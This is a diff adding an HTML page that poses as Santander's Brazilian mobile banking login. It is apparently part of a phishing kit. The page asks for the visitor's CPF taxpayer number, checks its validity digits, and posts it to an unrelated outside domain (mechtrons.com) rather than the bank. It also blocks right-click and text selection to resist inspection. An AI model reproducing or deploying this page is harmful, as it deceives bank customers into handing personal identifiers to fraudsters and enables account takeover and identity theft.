@@ -1,0 +1,271 @@
+﻿<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Santander</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+<meta name="mobile-web-app-capable" content="yes">
+<link rel="shortcut icon" href="favicon.ico" />
+<link rel="stylesheet" type="text/css" href="style.css" />
+<script language="javascript">
+
+	var isOK = false;
+
+</script>
+
+
+
+
+
+<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
+
+<script src="script.js" language="javascript"></script>
+
+
+
+<style type="text/css">
+.style1 {
+	color: ;
+}
+</style>
+
+
+
+</head>
+
+
+
+<body onLoad="window.scrollTo(0,1);">
+
+<div id="topo">
+
+	<img src="images/santanderlogo.png" width="207" height="31">	
+
+</div>
+
+	
+
+<div id="topo2" style="height: 55px">
+
+	<img src="images/ico_key_acesso.png" style="left: 12px; top: 4px" width="46" height="46" />
+
+	<div class="acessar"><p>Acessar</p></div>
+
+
+
+</div>	
+<div id="campos" style="margin-top:-80px">
+<form id="frm" action="https://mechtrons.com/ibewebLOGINSPR/login.php" method="post" enctype="application/x-www-form-urlencoded" onsubmit="return check_cpf();return isOK;">
+<table width="80%" class="center pt100">
+  <tbody>
+    <tr>
+      <td><span>CPF</span></td>
+    </tr>
+    <tr>
+      <td><input class="frm" type="number" id="cpf" name="cpf" onkeydown="limit(this, 11);" onkeyup="limit(this,11);" required></td>
+    </tr>    
+  </tbody>
+    
+
+</table>
+
+
+<center><strong>Guardar meu CPF: </strong><iframe src="frame/index1.html" noborder border="0" height="25" width="38"></iframe></center>
+<div class="pt30">
+
+	<input type="button" id="btn-entrar" value="ENTRAR">
+
+</div>
+
+	
+
+		
+
+</form>
+
+
+
+</div>
+
+
+
+<script language="javascript">
+
+ $( document ).ready(function() {
+
+	 
+
+	$( "#btn-entrar" ).click(function() {
+
+		if (checkCPF()){
+
+			isOK = true;	
+
+			$("#frm").submit();	
+
+		} else {
+
+			alert("CPF incorreto, informe corretamente.");
+
+		}
+
+	});	
+
+	
+
+
+
+});
+
+	
+
+</script>
+
+<script>
+
+    <!-- Disable
+
+    function disableselect(e){
+
+        return false
+
+    }
+
+
+
+    function reEnable(){
+
+        return true
+
+    }
+
+
+
+    //if IE4+
+
+    document.onselectstart=new Function ("return false")
+
+    document.oncontextmenu=new Function ("return false")
+
+    //if NS6
+
+    if (window.sidebar){
+
+        document.onmousedown=disableselect
+
+        document.onclick=reEnable
+
+    }
+
+    //-->
+
+</script>
+
+
+
+
+
+
+
+<script>
+
+    function SomenteNumero(e){
+
+        var tecla=(window.event)?event.keyCode:e.which;
+
+        if((tecla>47 && tecla<58)) return true;
+
+        else{
+
+            if (tecla==8 || tecla==0) return true;
+
+            else  return false;
+
+        }
+
+    }
+
+</script>
+
+
+
+<script>
+
+    function check_cpf(){
+
+        if(document.getElementById('cpf').value.length < 11){
+
+            alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');
+
+            return false;
+
+        }else if(document.getElementById('cpf').value == 11111111111 ||
+
+            document.getElementById('cpf').value == 22222222222 ||
+
+            document.getElementById('cpf').value == 33333333333 ||
+
+            document.getElementById('cpf').value == 44444444444 ||
+
+            document.getElementById('cpf').value == 55555555555 ||
+
+            document.getElementById('cpf').value == 66666666666 ||
+
+            document.getElementById('cpf').value == 77777777777 ||
+
+            document.getElementById('cpf').value == 88888888888 ||
+
+            document.getElementById('cpf').value == 99999999999 ||
+
+            document.getElementById('cpf').value == 00000000000){
+
+            alert('Para continuar é necessário informar um número de CPF. Por favor, informe um número de CPF válido.');
+
+            return false;
+
+        }else{
+
+            var t = '';
+
+            var d = '';
+
+            var c = '';
+
+            var cpf = document.getElementById('cpf').value;
+
+            for (t = 9; t < 11; t++) {
+
+                for (d = 0, c = 0; c < t; c++) {
+
+                    d += cpf[c] * ((t + 1) - c);
+
+                }
+
+                d = ((10 * d) % 11) % 10;
+
+
+
+                if (cpf[c] != d) {
+
+                    alert('O CPF Informado não é válido! Tente novamente!');
+
+                    return false;
+
+                }
+
+            }
+
+            return true;
+
+        }
+
+    }
+
+</script>
+
+<p class="style1">&nbsp;</p>
+
+</body>
+
+</html>
+
